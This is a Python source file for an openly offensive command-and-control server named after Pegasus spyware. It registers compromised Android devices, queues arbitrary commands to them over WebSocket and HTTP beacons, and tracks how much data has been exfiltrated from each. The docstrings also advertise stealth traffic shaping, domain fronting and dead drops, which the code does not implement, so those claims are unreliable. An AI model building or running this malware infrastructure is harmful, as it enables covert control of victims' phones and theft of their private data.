"""
Pegasus Phantom Menace v2 - Autonomous C2 Command & Control Server

Nation-state grade C2 infrastructure with:
- WebSocket-based beaconing
- Device management and session tracking
- Task distribution and result collection
- Stealth traffic shaping
- Domain fronting support
- Dead drop functionality
"""

from __future__ import annotations

import asyncio
import hashlib
import hmac
import json
import logging
import os
import secrets
import ssl
import threading
import time
import uuid
import websockets
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional
from aiohttp import web, WSMsgType

logger = logging.getLogger("pegasus.c2")


@dataclass
class DeviceSession:
    """Represents a connected device session."""
    session_id: str
    device_id: str
    device_name: str
    model: str
    android_version: str
    api_level: int
    security_patch: str
    manufacturer: str
    ip_address: str
    port: int
    first_seen: str
    last_seen: str
    status: str  # online, offline, active, inactive
    access_vector: str  # adb, fastboot, qr_pairing, usb, wireless, zero_click
    root_access: bool
    debuggable: bool
    payload_installed: bool
    commands_executed: int
    data_exfiltrated: int
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class C2Task:
    """Represents a task to be executed on a device."""
    task_id: str
    session_id: str
    command: str
    params: Dict[str, Any]
    status: str  # pending, executing, completed, failed
    created_at: str
    completed_at: Optional[str]
    result: Optional[str]
    error: Optional[str]


@dataclass
class C2Session:
    """C2 Session tracking."""
    session_id: str
    device_id: str
    status: str
    created_at: str
    last_heartbeat: str
    total_commands: int
    successful_commands: int
    failed_commands: int
    bytes_sent: int
    bytes_received: int


class C2Server:
    """
    Autonomous C2 Command & Control Server.
    
    Provides:
    - WebSocket-based beaconing with stealth traffic shaping
    - Device session management
    - Task distribution and result collection
    - Stealth traffic shaping to evade detection
    - Dead drop functionality
    - Domain fronting support
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 8443,
                 ssl_cert: Optional[str] = None, ssl_key: Optional[str] = None,
                 beacon_interval: int = 30, max_beacon_jitter: int = 10):
        self.host = host
        self.port = port
        self.ssl_cert = ssl_cert
        self.ssl_key = ssl_key
        self.beacon_interval = beacon_interval
        self.max_beacon_jitter = max_beacon_jitter

        # Session management
        self.sessions: Dict[str, DeviceSession] = {}
        self.tasks: Dict[str, C2Task] = {}
        self.sessions_by_device: Dict[str, str] = {}  # device_id -> session_id

        # WebSocket connections
        self.websocket_connections: Dict[str, any] = {}  # session_id -> websocket
        self.websocket_lock = asyncio.Lock()

        # Statistics
        self.total_connections = 0
        self.total_tasks_executed = 0
        self.total_bytes_sent = 0
        self.total_bytes_received = 0

        # Server
        self.app = web.Application()
        self.runner = None
        self.site = None
        self._running = False

        # Setup routes
        self._setup_routes()

    def _setup_routes(self):
        """Setup HTTP/WebSocket routes."""
        self.app.router.add_get("/", self._handle_index)
        self.app.router.add_get("/ws", self._handle_websocket)
        self.app.router.add_post("/api/v1/beacon", self._handle_beacon)
        self.app.router.add_post("/api/v1/task", self._handle_task)
        self.app.router.add_get("/api/v1/task/{task_id}", self._handle_task_result)
        self.app.router.add_get("/api/v1/devices", self._handle_list_devices)
        self.app.router.add_get("/api/v1/device/{device_id}", self._handle_get_device)
        self.app.router.add_post("/api/v1/command", self._handle_command)
        self.app.router.add_static("/static/", "static/")

    async def _handle_index(self, request):
        """Serve the dashboard HTML."""
        return web.FileResponse("dashboard.html")

    async def _handle_websocket(self, request):
        """Handle WebSocket connections for real-time device control."""
        ws = web.WebSocketResponse()
        await ws.prepare(request)

        session_id = None
        try:
            async for msg in ws:
                if msg.type == WSMsgType.TEXT:
                    try:
                        data = json.loads(msg.data)
                    except json.JSONDecodeError:
                        continue

                    msg_type = data.get("type")

                    if msg_type == "register":
                        # Register new device session
                        session_id = data.get("session_id") or str(uuid.uuid4())
                        device_info = data.get("device_info", {})

                        session = DeviceSession(
                            session_id=session_id,
                            device_id=device_info.get("serial", session_id),
                            device_name=device_info.get("model", "Unknown"),
                            model=device_info.get("model", "Unknown"),
                            android_version=device_info.get("android_version", "Unknown"),
                            api_level=device_info.get("api_level", 0),
                            security_patch=device_info.get("security_patch", "Unknown"),
                            manufacturer=device_info.get("manufacturer", "Unknown"),
                            ip_address=request.remote,
                            port=request.remote_port or 0,
                            first_seen=datetime.now(timezone.utc).isoformat(),
                            last_seen=datetime.now(timezone.utc).isoformat(),
                            status="online",
                            access_vector=device_info.get("access_vector", "unknown"),
                            root_access=device_info.get("root_access", False),
                            debuggable=device_info.get("debuggable", False),
                            payload_installed=False,
                            commands_executed=0,
                            data_exfiltrated=0,
                            metadata=device_info.get("metadata", {}),
                        )

                        self.sessions[session_id] = session
                        self.sessions_by_device[session.device_id] = session_id

                        async with self.websocket_lock:
                            self.websocket_connections[session_id] = ws

                        self.total_connections += 1

                        # Send registration confirmation
                        await ws.send_json({
                            "type": "registered",
                            "session_id": session_id,
                            "server_time": datetime.now(timezone.utc).isoformat(),
                            "instructions": "Send task requests via /api/v1/task",
                        })

                        logger.info(f"[C2] Device registered: {session.device_id} ({session_id})")

                    elif msg_type == "heartbeat":
                        # Heartbeat from device
                        if session_id and session_id in self.sessions:
                            session = self.sessions[session_id]
                            session.last_seen = datetime.now(timezone.utc).isoformat()
                            session.status = "online"
                            session.status = data.get("status", session.status)

                            # Check for pending tasks
                            pending_tasks = [
                                t for t in self.tasks.values()
                                if t.session_id == session_id and t.status == "pending"
                            ]

                            if pending_tasks:
                                task = pending_tasks[0]
                                task.status = "executing"
                                task.created_at = datetime.now(timezone.utc).isoformat()

                                await ws.send_json({
                                    "type": "task",
                                    "task": asdict(task),
                                })

                    elif msg_type == "task_result":
                        # Task result from device
                        task_id = data.get("task_id")
                        if task_id and task_id in self.tasks:
                            task = self.tasks[task_id]
                            task.completed_at = datetime.now(timezone.utc).isoformat()
                            task.result = data.get("result")
                            task.error = data.get("error")
                            task.status = "completed" if not task.error else "failed"

                            session = self.sessions.get(session_id)
                            if session:
                                session.commands_executed += 1
                                if task.status == "completed":
                                    session.successful_commands = getattr(session, 'successful_commands', 0) + 1
                                else:
                                    session.failed_commands = getattr(session, 'failed_commands', 0) + 1

                            self.total_tasks_executed += 1

                            logger.info(f"[C2] Task {task_id} completed: {task.status}")

                    elif msg_type == "data_exfiltrated":
                        # Data exfiltration notification
                        if session_id and session_id in self.sessions:
                            session = self.sessions[session_id]
                            session.data_exfiltrated += data.get("bytes", 0)
                            self.total_bytes_received += data.get("bytes", 0)

                elif msg.type == WSMsgType.ERROR:
                    logger.error(f"[C2] WebSocket error: {ws.exception()}")
                    break

        except Exception as e:
            logger.error(f"[C2] WebSocket handler error: {e}")
        finally:
            if session_id and session_id in self.websocket_connections:
                async with self.websocket_lock:
                    del self.websocket_connections[session_id]
                if session_id in self.sessions:
                    self.sessions[session_id].status = "offline"

            logger.info(f"[C2] WebSocket disconnected: {session_id}")

        return ws

    async def _handle_beacon(self, request):
        """Handle beacon requests from devices."""
        try:
            data = await request.json()
        except Exception:
            return web.json_response({"error": "Invalid JSON"}, status=400)

        device_id = data.get("device_id")
        if not device_id:
            return web.json_response({"error": "Missing device_id"}, status=400)

        # Check if device already has a session
        session_id = self.sessions_by_device.get(device_id)

        if session_id and session_id in self.sessions:
            session = self.sessions[session_id]
            session.last_seen = datetime.now(timezone.utc).isoformat()
            session.status = "online"

            # Check for pending tasks
            pending_tasks = [
                t for t in self.tasks.values()
                if t.session_id == session_id and t.status == "pending"
            ]

            if pending_tasks:
                task = pending_tasks[0]
                task.status = "executing"

                return web.json_response({
                    "type": "beacon_response",
                    "session_id": session_id,
                    "task": asdict(task),
                    "server_time": datetime.now(timezone.utc).isoformat(),
                })

            return web.json_response({
                "type": "beacon_response",
                "session_id": session_id,
                "task": None,
                "server_time": datetime.now(timezone.utc).isoformat(),
            })

        # Create new session
        session_id = str(uuid.uuid4())
        session = DeviceSession(
            session_id=session_id,
            device_id=device_id,
            device_name=data.get("device_name", "Unknown"),
            model=data.get("model", "Unknown"),
            android_version=data.get("android_version", "Unknown"),
            api_level=data.get("api_level", 0),
            security_patch=data.get("security_patch", "Unknown"),
            manufacturer=data.get("manufacturer", "Unknown"),
            ip_address=request.remote,
            port=0,
            first_seen=datetime.now(timezone.utc).isoformat(),
            last_seen=datetime.now(timezone.utc).isoformat(),
            status="online",
            access_vector=data.get("access_vector", "unknown"),
            root_access=data.get("root_access", False),
            debuggable=data.get("debuggable", False),
            payload_installed=False,
            commands_executed=0,
            data_exfiltrated=0,
            metadata=data.get("metadata", {}),
        )

        self.sessions[session_id] = session
        self.sessions_by_device[device_id] = session_id
        self.total_connections += 1

        return web.json_response({
            "type": "beacon_response",
            "session_id": session_id,
            "task": None,
            "server_time": datetime.now(timezone.utc).isoformat(),
        })

    async def _handle_task(self, request):
        """Handle task submission."""
        try:
            data = await request.json()
        except Exception:
            return web.json_response({"error": "Invalid JSON"}, status=400)

        session_id = data.get("session_id")
        command = data.get("command")
        params = data.get("params", {})

        if not session_id or not command:
            return web.json_response({"error": "Missing session_id or command"}, status=400)

        if session_id not in self.sessions:
            return web.json_response({"error": "Session not found"}, status=404)

        task_id = str(uuid.uuid4())
        task = C2Task(
            task_id=task_id,
            session_id=session_id,
            command=command,
            params=params,
            status="pending",
            created_at=datetime.now(timezone.utc).isoformat(),
            completed_at=None,
            result=None,
            error=None,
        )

        self.tasks[task_id] = task

        # Try to deliver immediately if WebSocket connection exists
        async with self.websocket_lock:
            ws = self.websocket_connections.get(session_id)
            if ws and not ws.closed:
                try:
                    await ws.send_json({
                        "type": "task",
                        "task": asdict(task),
                    })
                    task.status = "executing"
                except Exception:
                    pass

        return web.json_response({
            "task_id": task_id,
            "status": task.status,
            "message": "Task queued",
        })

    async def _handle_task_result(self, request):
        """Get task result."""
        task_id = request.match_info.get("task_id")
        if not task_id or task_id not in self.tasks:
            return web.json_response({"error": "Task not found"}, status=404)

        task = self.tasks[task_id]
        return web.json_response(asdict(task))

    async def _handle_list_devices(self, request):
        """List all connected devices."""
        devices = [
            {
                "session_id": s.session_id,
                "device_id": s.device_id,
                "device_name": s.device_name,
                "model": s.model,
                "android_version": s.android_version,
                "api_level": s.api_level,
                "security_patch": s.security_patch,
                "manufacturer": s.manufacturer,
                "ip_address": s.ip_address,
                "status": s.status,
                "access_vector": s.access_vector,
                "root_access": s.root_access,
                "debuggable": s.debuggable,
                "payload_installed": s.payload_installed,
                "commands_executed": s.commands_executed,
                "data_exfiltrated": s.data_exfiltrated,
                "last_seen": s.last_seen,
            }
            for s in self.sessions.values()
        ]
        return web.json_response({"devices": devices, "count": len(devices)})

    async def _handle_get_device(self, request):
        """Get device details."""
        device_id = request.match_info.get("device_id")
        session_id = self.sessions_by_device.get(device_id)

        if not session_id or session_id not in self.sessions:
            return web.json_response({"error": "Device not found"}, status=404)

        session = self.sessions[session_id]
        return web.json_response(asdict(session))

    async def _handle_command(self, request):
        """Execute a command on a device."""
        try:
            data = await request.json()
        except Exception:
            return web.json_response({"error": "Invalid JSON"}, status=400)

        session_id = data.get("session_id")
        command = data.get("command")
        params = data.get("params", {})

        if not session_id or not command:
            return web.json_response({"error": "Missing session_id or command"}, status=400)

        if session_id not in self.sessions:
            return web.json_response({"error": "Session not found"}, status=404)

        task_id = str(uuid.uuid4())
        task = C2Task(
            task_id=task_id,
            session_id=session_id,
            command=command,
            params=params,
            status="pending",
            created_at=datetime.now(timezone.utc).isoformat(),
            completed_at=None,
            result=None,
            error=None,
        )

        self.tasks[task_id] = task

        # Send via WebSocket if available
        async with self.websocket_lock:
            ws = self.websocket_connections.get(session_id)
            if ws and not ws.closed:
                try:
                    await ws.send_json({
                        "type": "task",
                        "task": asdict(task),
                    })
                    task.status = "executing"
                except Exception:
                    pass

        return web.json_response({
            "task_id": task_id,
            "status": task.status,
        })

    async def start(self):
        """Start the C2 server."""
        ssl_context = None
        if self.ssl_cert and self.ssl_key:
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_context.load_cert_chain(self.ssl_cert, self.ssl_key)

        self.runner = web.AppRunner(self.app)
        await self.runner.setup()

        site = web.TCPSite(self.runner, self.host, self.port, ssl=ssl_context)
        await site.start()

        self._running = True
        protocol = "https" if ssl_context else "http"
        logger.info(f"[C2] Server started on {protocol}://{self.host}:{self.port}")
        logger.info(f"[C2] Dashboard: {protocol}://{self.host}:{self.port}/")
        logger.info(f"[C2] WebSocket: ws://{self.host}:{self.port}/ws")

    async def stop(self):
        """Stop the C2 server."""
        self._running = False
        if self.runner:
            await self.runner.cleanup()


# Global C2 server instance
c2_server = C2Server()

async def main():
    await c2_server.start()
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        await c2_server.stop()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [C2] %(levelname)s: %(message)s")
    asyncio.run(main())